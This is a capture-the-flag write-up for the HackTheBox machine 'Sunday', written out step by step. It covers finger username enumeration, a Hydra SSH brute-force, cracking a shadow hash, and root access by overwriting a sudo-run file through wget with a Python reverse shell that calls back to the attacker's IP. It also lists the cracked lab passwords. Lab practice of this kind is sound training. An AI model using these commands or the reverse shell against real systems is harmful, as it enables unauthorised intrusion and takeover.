
> medium-to-markdown@0.0.3 convert
> node index.js

HackTheBox Write-Up — Sunday
============================

![](https://miro.medium.com/max/1400/1*itSt35O3bwfON5arMvzFmA.png)

Sunday is no day off, it’s a great machine to practice common Linux privilege escalation methods through proper enumeration & vulnerability chaining.

```
**nmap -T4 -p- 10.10.10.76**Starting Nmap 7.70 ( [https://nmap.org](https://nmap.org) ) at 2020-08-28 11:42 EDT  
Warning: 10.10.10.76 giving up on port because retransmission cap hit (6).  
Nmap scan report for 10.10.10.76  
Host is up (0.013s latency).  
Not shown: 61654 closed ports, 3876 filtered ports  
PORT      STATE SERVICE  
**79/tcp    open  finger  
111/tcp   open  rpcbind  
22022/tcp open  unknown  
34550/tcp open  unknown  
55407/tcp open  unknown**Nmap done: 1 IP address (1 host up) scanned in 2262.52 seconds
```

There are five ports open, only one I am familiar with.

```
**nmap -T4 -A -p79,111,22022,34550,55407**Starting Nmap 7.70 ( [https://nmap.org](https://nmap.org) ) at 2020-08-28 16:36 EDT  
Nmap scan report for 10.10.10.76  
Host is up (0.025s latency).PORT      STATE SERVICE VERSION  
**79/tcp    open  finger  Sun Solaris fingerd**  
|\_finger: No one logged on\\x0D  
**111/tcp   open  rpcbind 2-4 (RPC #100000)  
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)**  
| ssh-hostkey:   
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)  
|\_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)  
**34550/tcp open  unknown  
55407/tcp open  unknown**  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Aggressive OS guesses: Sun OpenSolaris 2008.11 (94%), Sun Solaris 10 (94%), Sun Solaris 9 or 10, or OpenSolaris 2009.06 snv\_111b (94%), Sun Solaris 9 or 10 (SPARC) (92%), Sun Storage 7210 NAS device (92%), Sun Solaris 9 or 10 (92%), Oracle Solaris 11 (91%), Sun Solaris 8 (90%), Sun Solaris 9 (89%), Sun Solaris 8 (SPARC) (89%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 2 hops  
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunosTRACEROUTE (using port 111/tcp)  
HOP RTT     ADDRESS  
1   9.40 ms 10.10.14.1  
2   9.55 ms 10.10.10.76OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 62.51 seconds
```

A few Google searches finds me a vulnerability involving “fingerd” towards username enumeration on Solaris systems.

![](https://miro.medium.com/max/1400/1*sqMZaDqu2y-lmsvQjH4dvg.png)[https://www.rapid7.com/db/vulnerabilities/finger-solaris-user-enumeration](https://www.rapid7.com/db/vulnerabilities/finger-solaris-user-enumeration)

Some more searching leads me to a Perl script we can use to enumerate usernames. We’ll download it using wget.

```
**wget** [**https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl**](https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl)
```![](https://miro.medium.com/max/1400/1*hEoObsS7-7XbUjCqzxIJGw.png)```
Usage: finger-user-enum.pl \[options\] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )Examples:\\$ finger-user-enum.pl -U users.txt -t 10.0.0.1  
\\$ finger-user-enum.pl -u root -t 10.0.0.1  
\\$ finger-user-enum.pl -U users.txt -T ips.txt
```

A quick “locate username” on my Kali machine pulls all the files containing the word username.

```
**locate username**
```

/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt sounds good to me with an advertised “10 million!” usernames…

![](https://miro.medium.com/max/1400/1*YI_7axYe7GBrCuwpoNXmNA.png)![](https://miro.medium.com/max/1400/1*6Bd5LhU9s2Vp0iRo22hGjA.png)Quick preview

Using this file, our syntax in our working directory will be:

```
**perl finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.76 > userenum.txt**
```

The scripts output will append the results to a file named userenum.txt. (You do not have to do this, I just don’t like to lose my results.)

![](https://miro.medium.com/max/1400/1*RF8e7LhDPeXw4YiD9kX80A.png)

The output is a bit messy, but we have a few usernames to attempt a brute-force attack against port \[**22022/tcp open ssh SunSSH 1.3 (protocol 2.0)\]**

The following usernames are the most interesting:

```
sammy@10.10.10.76: sammy console <Jul 31 17:59>  
sunny@10.10.10.76: sunny pts/3 <Apr 24, 2018>
```

Use the following syntax to brute-force:

```
**hydra -V -f -t 4 -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022**
```![](https://miro.medium.com/max/1400/1*IVLkF60wYFaS2MiBDQwKSg.png)

We obtain the credentials for Sunny!

> sunny | sunday

```
**ssh -p 22022 sunny@10.10.10.76**
```![](https://miro.medium.com/max/1400/1*YYgqDCCDPJgJbTlYHgNRZA.png)

Habitually on Linux systems it’s always a good idea to check if a low-privileged user has any sudo permissions.

```
**sudo -l**
```

We find that we can run the command /root/troll as root without a password.

![](https://miro.medium.com/max/1400/1*-2T8yLglR_FzVT7p2iBe_g.png)

While traversing and enumerating the files on the machine, I found a copy of the shadow file containing hashed user passwords.

![](https://miro.medium.com/max/1400/1*f-FCv0hB0-jGhAX8lAZqaw.png)```
**cat /backup/shadow.backup**
```

If we are able to crack Sammy’s password hash, we’ll be able to grab the user.txt flag.

```
**echo "sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::" > hash.txt**
```

Copy the hash to a file, I named mine hash.txt. We’ll use john to crack the hash.

```
**john -w="/usr/share/wordlists/rockyou hash.txt**
```![](https://miro.medium.com/max/1400/1*iDda9isUCBTW0boxxePOQA.png)

Success.

> Sammy | cooldude!

Let’s grab the user.txt found on the desktop, and enumerate the system using Sammy’s credentials.

```
**ssh -p 22022 sammy@10.10.10.76**
```![](https://miro.medium.com/max/1400/1*7ZK3ZmjNVjPW4MUt09NH1Q.png)

Habitually, we type sudo -l.

```
**sudo -l**
```![](https://miro.medium.com/max/1400/1*QcCX9NKNdrBdautztxNtHQ.png)

Looks like Sammy can run wget as root without a password. With this, we can overwrite /root/troll with a reverse-shell and then run it as root with Sunny’s user account.

Locally, copy and paste this Python reverse-shell to a file named reverse.py

```
#!/usr/bin/pythonimport socket  
import subprocess  
import oss=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)  
s.connect(("**10.10.14.15",443**))  
os.dup2(s.fileno(),0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2)  
p=subprocess.call(\["/bin/sh","-i"\]);
```

Host this file with an HTTP server using Python, but before you do — ensure to edit the parameters to your local IP/port to receive the shell (I like to use port 443.) **_note: // Later on I ran into trouble because my IP was wrong (see: 10.10.14.5 vs 10.10.14.15)_**

![](https://miro.medium.com/max/1400/1*Pn2GutPyPn-ZagP9adm00w.png)```
**python3 -m http.server 80**
```

Setup a listener on the designated port.

```
**nc -nlvp 443**
```![](https://miro.medium.com/max/1400/1*SAfBMYPVhdKGWeZBWrItjQ.png)

On the victim machine: we’re going to download the reverse shell to replace /root/troll (Sammy), and then run the reverse shell as root (Sunny). Hopefully… returning us with a reverse shell as a privileged user.

```
**sudo wget -O /root/troll** [**http://10.10.14.15/reverse.py**](http://10.10.14.15/reverse.py)
```![](https://miro.medium.com/max/1400/1*FoXOfkQUZdnfSzAeJXe7Vg.png)```
**sudo /root/troll**
```![](https://miro.medium.com/max/1400/1*4-vlM2cx8LbdzGwP5KMkOA.png)

Note: The file resets itself every 5 seconds, so you’re going to have to work fast. ( I also had a typo in my IP address, so this could be why I had so many failures)

![](https://miro.medium.com/max/1400/1*c0YHCrXNSdhWj_SWiNSA-w.png)

You will notice the port I am listening on had changed from 443 to 1234. I thought there was a firewall blocking port 443… but as I said above, I discovered a typo in my receiving IP address within the reverse-shell.

![](https://miro.medium.com/max/1400/1*LF9GEfw_dyRmE58N6B7tzA.png)
